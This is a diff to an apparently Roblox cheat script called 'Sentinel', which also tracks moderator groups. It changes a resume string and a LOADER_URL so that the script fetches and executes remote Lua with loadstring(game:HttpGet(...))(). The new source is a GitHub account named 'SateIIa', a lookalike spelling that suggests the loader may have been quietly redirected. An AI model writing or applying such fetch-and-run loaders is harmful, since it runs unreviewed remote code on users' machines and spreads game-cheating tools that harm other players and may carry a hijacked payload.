@@ -9148,7 +9148,7 @@ local __SB_CONFIG = {
 	moderator_groups = "4556484",
 }
 
-local __SB_RESUME = 'getgenv().SENTINEL_RESUMED_FROM_HOP = true\nif not game:IsLoaded() then game.Loaded:Wait() end\nloadstring(game:HttpGet("https://gitlab.com/makeawishfg/zfza/-/raw/main/runnable_version.lua"))()\n'
+local __SB_RESUME = 'getgenv().SENTINEL_RESUMED_FROM_HOP = true\nif not game:IsLoaded() then game.Loaded:Wait() end\nloadstring(game:HttpGet("https://raw.githubusercontent.com/SateIIa/ss/refs/heads/main/runnable_version.lua"))()\n'
 
 local __sbWarned = {}
 local function __sbNote(kind, what)
@@ -26903,7 +26903,7 @@ do
             local httpRequest = http_request or request or (http and http.request)
             local MENU_OUT_WAIT = 25
             local RESUME_FILE = 'sentinel/loader.lua'
-            local LOADER_URL = 'https://sentinel.heroinhound.cc/loader'
+            local LOADER_URL = 'https://raw.githubusercontent.com/SateIIa/ss/refs/heads/main/runnable_version.lua'
             local ROGUE_PLACE = 3016661674
             local LIST_ATTEMPTS = 3
             local LIST_BACKOFF = 1.5
